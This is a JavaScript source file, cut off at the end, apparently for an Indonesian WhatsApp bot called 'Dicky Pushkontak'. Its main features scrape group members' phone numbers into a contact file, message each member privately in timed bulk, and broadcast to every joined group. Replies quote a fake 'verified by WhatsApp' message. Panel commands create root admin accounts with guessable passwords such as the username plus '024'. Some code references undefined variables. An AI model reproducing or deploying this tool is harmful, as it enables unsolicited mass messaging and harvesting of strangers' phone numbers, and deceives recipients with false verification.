require("./config")
const {
smsg, getGroupAdmins, formatp, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize
} = require('./lib/myfunction')
const { downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, generateWAMessageContent, generateWAMessage, makeInMemoryStore, prepareWAMessageMedia, generateWAMessageFromContent, MediaType, areJidsSameUser, WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, GroupMetadata, initInMemoryKeyStore, getContentType, MiscMessageGenerationOptions, useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, WALocationMessage, ReconnectMode, WAContextInfo, proto, WAGroupMetadata, ProxyAgent, waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, MediaConnInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, WAMediaUpload, mentionedJid, processTime, Browser, MessageType, Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, GroupSettingChange, DisconnectReason, WASocket, getStream, WAProto, isBaileys, AnyMessageContent, fetchLatestBaileysVersion, templateMessage } = require('@whiskeysockets/baileys')
const axios = require('axios')
const os = require('os')
const fs = require('fs')
const {
    webp2mp4File,
    floNime
} = require('./lib/uploader')
const { formatSize } = require('./lib/myfunnc3')
const { TelegraPh, UploadFileUgu } = require('./lib/Upload_Url');
const { mediafireDl } = require('./lib/mediafire.js')
const util = require('util')
const cron = require('node-cron')
const fetch = require('node-fetch')
const speed = require('performance-now')
const moment = require('moment-timezone')
const { spawn: spawn, exec } = require('child_process')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const { performance } = require('perf_hooks')
const ytdl = require("ytdl-core")
const colors = require('@colors/colors/safe')
const chalk = require('chalk')
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const { toPTT, toAudio } = require("./lib/converter")
const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const owner = JSON.parse(fs.readFileSync('./database/owner.json'));
const { Saweria } = require("./lib/saweria")
let db_saweria = JSON.parse(fs.readFileSync('./data/saweria.json'));
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys')
const pino = require('pino')
//  Base
module.exports = async (Dicky, m) => {
try {
const from = m.key.remoteJid
const quoted = m.quoted ? m.quoted : m
var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') && m.message.buttonsResponseMessage.selectedButtonId ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') && m.message.listResponseMessage.singleSelectreply.selectedRowId ? m.message.listResponseMessage.singleSelectreply.selectedRowId : (m.mtype == 'templateButtonreplyMessage') && m.message.templateButtonreplyMessage.selectedId ? m.message.templateButtonreplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') && JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectreply.selectedRowId || m.text) : ""
      var budy = (typeof m.text == 'string' ? m.text : '')
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const botNumber = await Dicky.decodeJid(Dicky.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = ["6283857564133@s.whatsapp.net", botNumber, ...global.ownNumb].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const mime = (quoted.msg || quoted).mimetype || quoted.mediaType || "";
const isMedia = /image|video|sticker|audio/.test(mime)
        const qmsg = (quoted.msg || quoted)
// Group
const groupMetadata = m.isGroup ? await Dicky.groupMetadata(m.chat).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const isGroup = m.key.remoteJid.endsWith('@g.us')
const groupOwner = m.isGroup ? groupMetadata.owner : ''
const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false


const moment = require('moment-timezone')
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss")
if(time2 < "19:00:00"){
var ucapanWaktu = "Selamat Malam🌃"
}
if(time2 < "15:00:00"){
var ucapanWaktu = "Selamat Sore🌄"
 }
if(time2 < "11:00:00"){
var ucapanWaktu = "Selamat Siang🏞️"
}
if(time2 < "06:00:00"){
var ucapanWaktu = "Selamat Pagi🏙️ "
 }
if(time2 < "23:59:00"){
var ucapanWaktu = "Selamat Subuh🌆"
}
const wib = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("HH:mm:ss z")
const wita = moment(Date.now()).tz("Asia/Makassar").locale("id").format("HH:mm:ss z")
const wit = moment(Date.now()).tz("Asia/Jayapura").locale("id").format("HH:mm:ss z")
const salam2 = moment(Date.now()).tz("Asia/Jakarta").locale("id").format("a")
const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `Dicky Store`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;DickyBot,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://telegra.ph/file/a915fdf6f21ad99179f15.jpg' }}}}
//Public dan Self
if (!Dicky.public) {
if (!isCreator && !m.key.fromMe) return
}
const tanggal = moment().tz("Asia/Jakarta").format("ll")

// Quoted
const { type } = m
const isImage = (type == 'imageMessage')
const isQuotedMsg = (type == 'extendedTextMessage')
const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false
const isVideo = (type == 'videoMessage')
const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
const isSticker = (type == 'stickerMessage')
const isQuotedSticker = isQuotedMsg ? content.includes('stickerMessage') ? true : false : false 
const isQuotedAudio = isQuotedMsg ? content.includes('audioMessage') ? true : false : false

// Function untuk menyimpan data
function savePremiumData() {
  fs.writeFileSync('./database/premium.json', JSON.stringify(premium, null, 2));
}

function saveOwnerData() {
  fs.writeFileSync('./database/owner.json', JSON.stringify(owner, null, 2));
}

// Function untuk mengecek status
function isPremium(sender) {
  return premium.includes(sender) || owner.includes(sender) || isCreator;
}

function isOwnerUser(sender) {
  return owner.includes(sender) || isCreator;
}

// Handler untuk menambah premium
const addPremHandler = async (m, args) => {
  if (!isCreator) return reply('Maaf, hanya Creator yang bisa menambah Premium');

  if (args.length === 0) {
      return reply('Masukkan nomor yang ingin dijadikan Premium');
  }

  const nomorPrem = args[0].replace(/[^\d]/g, '');

  if (premium.includes(nomorPrem)) {
      return reply('Nomor sudah terdaftar sebagai Premium');
  }

  premium.push(nomorPrem);
  savePremiumData();

  reply(`Berhasil menambahkan ${nomorPrem} sebagai user Premium`);
}



// Console
if (isGroup && isCmd) {
console.log(colors.green.bold("[Group]") + " " + colors.brightCyan(time2,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(groupName));
}

if (!isGroup && isCmd) {
console.log(colors.green.bold("[Private]") + " " + colors.brightCyan(time2,) + " " + colors.black.bgYellow(command) + " " + colors.green("from") + " " + colors.blue(pushname));
}

function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 15;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}

function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}

const fVerif = { key: {
    participant: '0@s.whatsapp.net',
    remoteJid: '0@s.whatsapp.net'
  },
  message: { conversation: `_Dicky Terverifikasi Oleh WhatsApp_`}
}
const reply = async(teks) => 
      {
        Dicky.sendMessage(
          from, 
            {text: 
              teks, 
                contextInfo: 
                  {
                    forwardingScore: 999,
                      isForwarded: true,
                forwardedNewsletterMessageInfo: 
              {
          newsletterName: 'Dicky - MD',
      newsletterJid: "120363307170529595@g.us",
    }}},
      {quoted:fVerif}
    )
  }
const Reply = async(teks) => 
      {
        Dicky.sendMessage(
          from, 
            {text: 
              teks, 
                contextInfo: 
                  {
                    forwardingScore: 999,
                      isForwarded: true,
                forwardedNewsletterMessageInfo: 
              {
          newsletterName: 'Dicky - MD',
      newsletterJid: "120363307170529595@g.us",
    }}},
      {quoted:fVerif}
    )
  }


const tag = `@${m.sender.split('@')[0]}`
const totalFitur = () =>{
            var mytext = fs.readFileSync("./case.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }

if (mek.key.id.startsWith('3EB0')) return




Dicky.name = `Dicky Pushkontak`
  Dicky.number = Dicky.user?.["id"]["split"](":")[0] + "@s.whatsapp.net"
  Dicky.owner = {
    "name": `Dicky Pushkontak WhatsApp`,
    "number": `6281224824509@s.whatsapp.net`
  }
//Function PushKontak

Dicky.reply = async (mesegs, teks, urlImage) => {
    if (!urlImage) {
    try {
      await Dicky.sendMessage(mesegs.chat, {
      "text": teks
      }, { "quoted": mesegs })
    } catch (error) {
      console.log("Terjadi Kesalahan" + error)
    }
    } else {
    try {
      await Dicky.sendMessage(mesegs.chat, {
      "image": { "url": '' + urlImage },
      "caption": teks
      }, { "quoted": mesegs })
    } catch (error) {
      console.log("Terjadi Kesalahan" + error)
    }
    }
  }
Dicky.groups = async () => {
    const pArtiCpnts = await Dicky.groupFetchAllParticipating()
    return Object.values(pArtiCpnts)
  }
Dicky.showGroups = async msgse => {
  let hituet = 0
  let getGroups = await Dicky.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
    const getDlgc = await Dicky.groups()
    try {
    const All1 = getDlgc.map((txty1, txty2) => {
      const meksh = [`*GROUP KE ${hituet+=1}*\n*NAME*: ` + txty1.subject + "\n*ID*: " + txty1.id.split("@")[0] + "@g.us" + "\n*JUMLAH MEMBER*: " + txty1.participants.length + " Member"].join("\n\n")
      return meksh
    }).join("\n\n")
    Dicky.reply(msgse, `*BOT BY Dicky*\n*Total Group : ${anu.length}*\n\n` + All1)
    } catch (Ror) {
    Dicky.reply(msgse, "List Group\n\n" + Ror)
    console.log("ERROR! " + "List Group\n" + Ror)
    }
  }
  /*Dicky.pushContacts = async (nsgegs, idgcnye, txt1ortxt2) => {
    try {
    const mtData = await Dicky.groupMetadata(idgcnye)
    let { participants } = mtData
    participants = participants.map(v => v.id)
    const Txt1 = txt1ortxt2.split("|")[0]
    const Txt2 = parseInt((txt1ortxt2.split("|")[1] || 15) + "000")
    if (!Txt1 || !Txt2 || isNaN(Txt2)) {
      return Dicky.reply(nsgegs, "*Format yang anda berikan tidak valid*\n*Contoh*: .pushcontacts Hallo ... Pesan|5*")
    } else {
      await Dicky.reply(nsgegs, "*Push Contacts Start*:\n*Target*: " + participants.length + " members\n*Text*: " + Txt1 + "\n*Delay*: " + Txt2)
      let prtcpnts = 0
      const stIntvral = setInterval(async () => {
      if (prtcpnts === participants.length) {
        await Dicky.reply(nsgegs, "*Push Contacts selesai*\n*" + prtcpnts + " pesan telah berhasil dikirim*")
        return clearInterval(stIntvral)
      } else {
        if (Object.keys(nsgegs.message)[0] === "imageMessage") {
        const urlImeg = await downloadMediaMessage(nsgegs, "buffer", {}, { "logger": pino })
        await Dicky.sendMessage(participants[prtcpnts], { "image": urlImeg, "caption": '' + Txt1 })
        } else {
        await Dicky.sendMessage(participants[prtcpnts], { "text": '' + Txt1 })
        }
        prtcpnts++
      }
      }, Txt2)
    }
    } catch (conError) {
    Dicky.reply(nsgegs, "BOT BY Dicky\nPUSH CONTACTS\n" + conError)
    }
  }*/

    let isPaused = false; // Variabel untuk mengontrol status pause

Dicky.pushContacts = async (nsgegs, idgcnye, txt1ortxt2) => {
    try {
        const mtData = await Dicky.groupMetadata(idgcnye);
        let { participants } = mtData;
        participants = participants.map(v => v.id);
        const Txt1 = txt1ortxt2.split("|")[0];
        const Txt2 = parseInt((txt1ortxt2.split("|")[1] || 15) + "000");

        if (!Txt1 || !Txt2 || isNaN(Txt2)) {
            return Dicky.reply(nsgegs, "PUSH CONTACTS\n\n" + "*Format yang anda berikan tidak valid*\n*Contoh*: .pushcontacts Hallo ... Pesan|5*");
        } else {
            await Dicky.reply(nsgegs, "PUSH CONTACTS\n\n" + "*Push Contacts Start*:\n*Target*: " + participants.length + " members\n*Text*: " + Txt1 + "\n*Delay*: " + Txt2);
            let prtcpnts = 0;

            const stIntvral = setInterval(async () => {
                if (isPaused) return; // Jika dijeda, keluar dari fungsi

                if (prtcpnts === participants.length) {
                    await Dicky.reply(nsgegs, "PUSH CONTACTS\n\n" + "*Push Contacts selesai*\n*" + prtcpnts + " pesan telah berhasil dikirim*");
                    return clearInterval(stIntvral);
                } else {
                    if (Object.keys(nsgegs.message)[0] === "imageMessage") {
                        const urlImeg = await downloadMediaMessage(nsgegs, "buffer", {}, { "logger": pino });
                        await Dicky.sendMessage(participants[prtcpnts], { "image": urlImeg, "caption": '' + Txt1, quoted: fVerif });
                    } else {
                        await Dicky.sendMessage(participants[prtcpnts], { "text": '' + Txt1, quoted: fVerif });
                    }
                    prtcpnts++;
                }
            }, Txt2);
        }
    } catch (conError) {
        Dicky.reply(nsgegs, "PUSH CONTACTS\n" + conError);
    }
};

  Dicky.sendChatAllGroup = async (mesegesp, tx1tx2) => {
    const getidnya = await Dicky.groupFetchAllParticipating()
    const groups = Object.entries(getidnya).slice(0).map((entry) => entry[1])
    const anu = groups.map((v) => v.id)
    try {
    const Txt1 = tx1tx2.split("|")[0]
    const Txt2 = parseInt((tx1tx2.split("|")[1] || 15) + "000")
    if (!Txt1 || !Txt2 || isNaN(Txt2)) {
      return Dicky.reply(mesegesp, "*Format yang anda berikan tidak valid*\n*Contoh*: .jpm Hallo ... Pesan|5*")
    } else {
      await Dicky.reply(mesegesp, "*Broadcast Start*:\n*Target*: " + anu.length + " groups\n*Text*: " + Txt1 + "\n*Delay*: " + Txt2)
      let idgcwy = 0
      const stIntvral = setInterval(async () => {
      if (idgcwy === anu.length) {
        await Dicky.reply(mesegesp, "CHAT ALL GROUP\n\n" + "*Broadcast Selesai*\n*" + idgcwy + " pesan telah berhasil dikirim*")
        return clearInterval(stIntvral)
      } else {
        if (Object.keys(mesegesp.message)[0] === "imageMessage") {
        const urlImeg = await downloadMediaMessage(mesegesp, "buffer", {}, { "logger": pino })
        await Dicky.sendMessage(anu[idgcwy], { "image": urlImeg, "caption": '' + Txt1 })
        } else {
        await Dicky.sendMessage(anu[idgcwy], { "text": '' + Txt1 })
        }
        idgcwy++
      }
      }, Txt2)
    }
    } catch (ErrorK) {
    Dicky.reply(mesegesp, "BOT BY Dicky\nCHAT ALL GROUP\n\n" + ErrorK)
    }
  }

  Dicky.saveContacts = async (messgs, Prtcipnts) => {
    try {
    const getPrtpnts = Prtcipnts.map((send1, send2) => {
      const SvdQ = `${global.save}` + send2
      const hsilDtbs = ["BEGIN:VCARD", "VERSION:3.0", "FN:" + SvdQ, "ORG:" + Dicky.name, "TEL;type=CELL;type=VOICE;waid=" + send1.id.split("@")[0x0] + ":+" + send1.id.split("@")[0x0], "END:VCARD", ''].join("\n")
      return hsilDtbs
    }).join('')
    await Dicky.sendMessage(messgs.key.remoteJid, { "document": Buffer.from(getPrtpnts, "utf8"), "fileName": "contacts.vcf", "caption": "*Silahkan Di Pencet Untuk Save Kontak*", "mimetype": "text/x-vcard" }, { "quoted": messgs })
    } catch (SvdError) {
    Dicky.reply(messgs, "BOT BY Dicky\nAUTO SAVE CONTACTS\n\n" + '' + SvdError)
    }
  }

  async function handlePanelFeature(command, args, m) {

    const userer = m.sender.split('@')[0];
    switch (command) {


       // List Server
       case 'listsrv':
        case 'listsrv-v2': {
          if (!isOwnerUser(userer)) {
            return reply("Hanya Premium")
          }

            const f = await fetch(`${domain_use}/api/application/servers`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey_use}`
                }
            });

            const res = await f.json();
            let messageText = "*📋 DAFTAR SERVER*\n\n";

            res.data.forEach(server => {
                const s = server.attributes;
                messageText += `• ID: ${s.id}\n`;
                messageText += `• Nama: ${s.name}\n`;
                messageText += `• Status: ${s.status}\n\n`;
            });

            reply(messageText);
            break;
        }

        // List User
        case 'listusr':
        case 'listusr-v2': {
          if(!isOwnerUser(userer)) {
            return reply("hanya owner")
          }

            const f = await fetch(`${domain_use}/api/application/users`, {
                method: "GET",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey_use}`
                }
            });

            const res = await f.json();
            let messageText = "*👥 DAFTAR USER*\n\n";

            res.data.forEach(user => {
                const u = user.attributes;
                messageText += `• ID: ${u.id}\n`;
                messageText += `• Username: ${u.username}\n`;
                messageText += `• Email: ${u.email}\n\n`;
            });

            reply(messageText);
            break;
        }

        // Delete Server
        case 'delsrv':
        case 'delsrv-v2': {
          if(!isOwnerUser(userer)){
            return reply("hanya owner");
          }
            if (!args[0]) return reply('Masukkan ID server yang ingin dihapus');

            const f = await fetch(`${domain_use}/api/application/servers/${args[0]}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey_use}`
                }
            });

            reply(f.ok ? '*✅ Server Berhasil Dihapus*' : '*❌ Gagal Menghapus Server*');
            break;
        }

        // Delete User
        case 'delusr':
        case 'delusr-v2': {
          if(!isOwnerUser(userer)){ return reply("hanya owner"); }
            if (!args[0]) return reply('Masukkan ID user yang ingin dihapus');

            const f = await fetch(`${domain_use}/api/application/users/${args[0]}`, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey_use}`
                }
            });

            reply(f.ok ? '*✅ User Berhasil Dihapus*' : '*❌ Gagal Menghapus User*');
            break;
        }

        // Create Admin
        case 'createadmin': {
          if(!isOwnerUser(userer)){ return reply("hanya owner"); }
            const [username, number] = args[0].split(',');
            if (!username || !number) return reply('Format: createadmin username,nomor');

            const password = username + "024";
            const f = await fetch(`${domain}/api/application/users`, {
                method: "POST",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey}`
                },
                body: JSON.stringify({
                    email: `${username}@admin.com`,
                    username: username,
                    first_name: username,
                    last_name: "Admin",
                    language: "en",
                    root_admin: true,
                    password: password
                })
            });

            const result = await f.json();
            if (result.attributes) {
                reply(`*✅ ADMIN CREATED*\n• Username: ${username}\n• Password: ${password}\n• Nomor: ${number}`);
            } else {
                reply('*❌ Gagal Membuat Admin*');
            }
            break;
        }

        // Create Panel
        case 'createpanel': {
          if(!isPremium(userer)){ return reply("hanya owner"); }
            const [username, number, ram, disk, cpu] = args[0].split(',');
            if (!username || !number || !ram || !disk || !cpu) {
                return reply('Format: createpanel username,nomor,ram,disk,cpu');
            }

            const password = username + "015";
            const email = `${username}@panel.com`;

            // Buat User
            const userResponse = await fetch(`${domain}/api/application/users`, {
                method: "POST",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey}`
                },
                body: JSON.stringify({
                    email: email,
                    username: username,
                    first_name: username,
                    last_name: "Panel",
                    language: "en",
                    password: password
                })
            });

            const userData = await userResponse.json();
            if (!userData.attributes) return reply('*❌ Gagal Membuat User*');

            // Buat Server
            const serverResponse = await fetch(`${domain}/api/application/servers`, {
                method: "POST",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${apikey}`
                },
                body: JSON.stringify({
                    name: username,
                    user: userData.attributes.id,
                    egg: 15, // Sesuaikan dengan kebutuhan
                    docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                    startup: "npm start",
                    limits: {
                        memory: parseInt(ram),
                        disk: parseInt(disk),
                        cpu: parseInt(cpu)
                    },
                    feature_limits: {
                        databases: 5,
                        backups: 5
                    }
                })
            });

            const serverData = await serverResponse.json();
            if (serverData.attributes) {
                reply(`*✅ PANEL CREATED*
• Username: ${username}
• Password: ${password}
• Nomor: ${number}
• Server ID: ${serverData.attributes.id}`)
            } else {
                reply('*❌ Gagal Membuat Server*');
            }
          }
            break


    }
  }


switch(command) {

    case 'login': {
        if (!isCreator) return reply(`khusus creator`);
        if (db_saweria.length == 1) return reply(`Sudah login disaweria...`);
        if (m.isGroup) return reply(`khusus di private bang`);
        if (!q) return reply(`Contoh: ${prefix + command} email@gmail.com,password`);
        if (!q.split("@")[1]) return reply(`Contoh: ${prefix + command} email@gmail.com,password`);
        if (!q.split(".")[1]) return reply(`Contoh: ${prefix + command} email@gmail.com,password`);
        if (!q.split(",")[1]) return reply(`Contoh: ${prefix + command} email@gmail.com,password`);

        await reply("Sedang mencoba login...");
        let Pay = new Saweria(db_saweria);
        let res = await Pay.login(q.split(",")[0], q.split(",")[1]);

        if (!res.status) return reply(`Terjadi kesalahan saat login:\n${res.msg}`);

        await sleep(500);
        await reply(`*LOGIN SUKSES ✅*\n\n*USER ID:* ${res.data.user_id}`);
        db_saweria.push(res.data.user_id);
        fs.writeFileSync("./data/saweria.json", JSON.stringify(db_saweria));
    }
    break;

    case 'depo-otomatis': {
        if (fs.existsSync("./database/gateway/" + sender.split("@")[0] + ".json")) 
            return reply(`Proses deposit-otomatis kamu masih ada yang belum terselesaikan.\n\nKetik *${prefix}batal-membeli* untuk membatalkan.`);

        if (!q) return reply(`Contoh: ${prefix + command} 1000`);

        let Pay = new Saweria(db_saweria);
        let res = await Pay.createPayment(q, "BUY " + q);

        if (!res.status) return reply(`Terjadi kesalahan saat menghasilkan pembayaran:\n${res.msg}`);

        let teks = `乂 INFO PEMBAYARAN

    - Transfer sebelum:
    - ${res.data.expired_at} WIB

    - ID Pembayaran: ${res.data.id}
    - Total Transfer: Rp${toRupiah(res.data.amount_raw)}

    NOTE:
    > Kode QR hanya valid untuk 1 kali transfer.
    > Jika ingin membatalkan ketik ${prefix}batal-membeli
    > Setelah transfer, tunggu beberapa saat
    > Jika pembayaran berhasil, status akan diperbarui otomatis.
    > Untuk bantuan lebih lanjut, hubungi ${prefix}owner`;

        let object_buy = {
            number: sender,
            id: res.data.id
        };

        fs.writeFile("./database/gateway/" + sender.split("@")[0] + ".json", JSON.stringify(object_buy, null, 3), () => {
            Dicky.sendMessage(from, { image: Buffer.from(res.data.qr_image.split(',')[1], 'base64'), caption: teks }, { quoted: m });
        });

        let status = false;
        while (!status) {
            await sleep(500);
            let ress = await Pay.checkPayment(res.data.id);
            status = ress.status;
            if (ress.status) {
                await Dicky.sendMessage(sender, { text: `Deposit Berhasil ✅\nTotalharga: ${toRupiah(res.data.amount_raw)}\nStatus: Berhasil` });
                fs.unlinkSync("./database/gateway/" + sender.split("@")[0] + ".json");
            }
        }
    }
    break;

    case 'batal-membeli': {
        if (!fs.existsSync("./database/gateway/" + sender.split("@")[0] + ".json")) return;
        await reply("Baik Kak Transaksi Berhasil Di Batalkan ✅.");
        fs.unlinkSync("./database/gateway/" + sender.split("@")[0] + ".json");
    }
    break;

  case 'addprem': {
    await addPremHandler(m, args);
    break;
}
case 'addowner': {
    await addOwnerHandler(m, args);
    break;
}

  case "pause": {
    isPaused = true; // Set status pause
    Dicky.reply(m, "Pengiriman pesan telah dijeda.");
    break;
}
case "lanjut": {
    isPaused = false; // Set status lanjut
    Dicky.reply(m, "Pengiriman pesan dilanjutkan.");
    break;
}
// ... case lainnya

case "menu": {
const totalMem = os.totalmem();
const freeMem = os.freemem();
const usedMem = totalMem - freeMem;
const formattedUsedMem = formatSize(usedMem);
const formattedTotalMem = formatSize(totalMem);
let pok = `Hi 👋 ${pushname} saya adalah bot Pushkontak yang di buat oleh Dicky, Jika menemukan Error Silahkan Report ke owner

▧  Info Bot
│ • BotName: ${namebot}
│ • OwnerName: ${namaowner}
│ • Info : Case
│ • Library : @whiskeysocket/baileys
│ • RAM : ${formattedUsedMem} / ${formattedTotalMem}
│ • Date : ${new Date().toLocaleString()}
└───···
▧ Pushkontak Menu
│ • ${prefix}cekidgc [Maintenance]
│ • ${prefix}savecontactgc [Maintenance]
│ • ${prefix}savecontactid [Maintenance]
│ • ${prefix}pushkontakgc [Maintenance]
│ • ${prefix}pushkontakid [Maintenance]
│ • ${prefix}jpm [Maintenance]
│ • ${prefix}push
└───···

Original Script || By Dicky`
Dicky.sendMessage(m.chat, {
    document: fs.readFileSync("./package.json"),
    fileName: `${ucapanWaktu}`,
    mimetype: 'application/pdf',
    caption: pok,
    contextInfo: {
        forwardingScore: 10,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
            newsletterJid: idsal,
            serverMessageId: null,
            newsletterName: "Dicky"
        },
        externalAdReply: {
            showAdAttribution: true,
            title: "Bot Create By Dicky",
            body: "Dicky - Store",
            jpegThumbnail: "https://pomf2.lain.la/f/2wbatou6.jpg", // Use the URL here
            sourceUrl: "https://wa.me/6283857564133",
            mediaType: 1,
            renderLargerThumbnail: true 
        }
    }
}, {});
}
break
case "cekidgc": case "cekid": {
  if (!isCreator) return reply("ᴍᴀᴀғ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ɪɴɪ ᴅɪᴋᴀʀᴇɴᴀᴋᴀɴ ᴀɴᴅᴀ ʙᴜᴋᴀɴ ᴏᴡɴᴇʀ")
  Dicky.showGroups(m)
}
break
case "savecontactgc": {
  if (!isCreator) {
    return reply("ᴍᴀᴀғ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ɪɴɪ ᴅɪᴋᴀʀᴇɴᴀᴋᴀɴ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴘʀᴇᴍɪᴜᴍ/ᴏᴡɴᴇʀ")
  } else {
    if (!isGroup) {
      return reply("Khusus Dalam Group Yah Bang putra")
    } else {
      const { participants } = await Dicky.groupMetadata(from)
      Dicky.saveContacts(m, participants)
    }
  }
}
break
case "savecontactid": {
  if (!isCreator) {
    return reply("ᴍᴀᴀғ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ɪɴɪ ᴅɪᴋᴀʀᴇɴᴀᴋᴀɴ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴘʀᴇᴍɪᴜᴍ/ᴏᴡɴᴇʀ")
  } else {
    if (!q) {
      return Dicky.reply(m, "BOT BY Dicky\nSAVE CONTACTS ID\n\n" + "*Pastikan format yang anda berikan valid*\n*Contoh*: .savecontactsid 120363262065845429@g.us")
    } else {
      const prtpnt = await Dicky.groupMetadata(q)
      Dicky.saveContacts(m, prtpnt.participants)
    }
  }
}
break
case "pushkontakgc": {
  if (!isCreator) {
    return reply("ᴍᴀᴀғ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ɪɴɪ ᴅɪᴋᴀʀᴇɴᴀᴋᴀɴ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴘʀᴇᴍɪᴜᴍ/ᴏᴡɴᴇʀ")
  } else {
    if (!isGroup) {
      return reply("Khusus Dalam Group")
    } else {
      if (!q) {
        await Dicky.reply(m, "BOT BY Dicky \nPUSH CONTACTS\n\n" + `*Format Yang Anda Berikan Tidak Valid*\n*Contoh*: .${command} Hallo Kak|5`)
      } else {
        Dicky.pushContacts(m, nx.chat, q)
      }
    }
  }
}
break
case "pushkontakid": {
  if (!isCreator) {
    return reply("ᴍᴀᴀғ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ʙɪsᴀ ᴍᴇɴɢɢᴜɴᴀᴋᴀɴ ғɪᴛᴜʀ ɪɴɪ ᴅɪᴋᴀʀᴇɴᴀᴋᴀɴ ᴀɴᴅᴀ ʙᴇʟᴜᴍ ᴘʀᴇᴍɪᴜᴍ/ᴏᴡɴᴇʀ")
  } else {
    if (!q) {
